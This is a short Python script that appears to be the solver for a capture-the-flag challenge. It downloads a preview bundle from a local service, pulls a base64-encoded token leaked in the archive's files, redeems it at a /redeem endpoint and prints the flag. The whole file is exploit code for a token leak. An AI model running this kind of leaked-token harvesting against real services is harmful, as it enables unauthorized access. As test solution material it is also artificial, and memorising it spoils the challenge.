#!/usr/bin/env python3
from __future__ import annotations

import base64
import io
import os
import re
import urllib.parse
import urllib.request
from zipfile import ZipFile


def main() -> None:
    base_url = os.getenv('BASE_URL', 'http://127.0.0.1:8080').rstrip('/')
    data = urllib.request.urlopen(f'{base_url}/download/preview-bundle.zip').read()
    token = None
    with ZipFile(io.BytesIO(data)) as zf:
        for name in zf.namelist():
            text = zf.read(name).decode('utf-8', errors='ignore')
            match = re.search(r'preview token fragment saved as:\s*([A-Za-z0-9+/=]+)', text)
            if match:
                token = base64.b64decode(match.group(1)).decode()
                break
    if not token:
        raise SystemExit('token not found')
    body = urllib.request.urlopen(
        f'{base_url}/redeem?token={urllib.parse.quote(token)}'
    ).read().decode()
    match = re.search(r'flag\{[a-zA-Z0-9_\-]+\}', body)
    if not match:
        raise SystemExit('flag not found')
    print(match.group(0))


if __name__ == '__main__':
    main()
